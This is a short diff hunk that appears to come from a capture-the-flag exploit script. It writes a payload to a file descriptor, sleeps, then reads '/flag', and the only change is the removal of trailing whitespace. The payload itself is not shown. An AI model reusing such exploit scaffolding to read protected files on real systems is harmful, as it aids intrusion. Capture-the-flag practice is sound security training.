@@ -20,5 +20,5 @@ os.write(fd, payload)
 os.close(fd)
 
 # run_cmd() will not wait for the command to finish
-pwn.sleep(1)  
+pwn.sleep(1)
 print(pwn.read("/flag").decode())
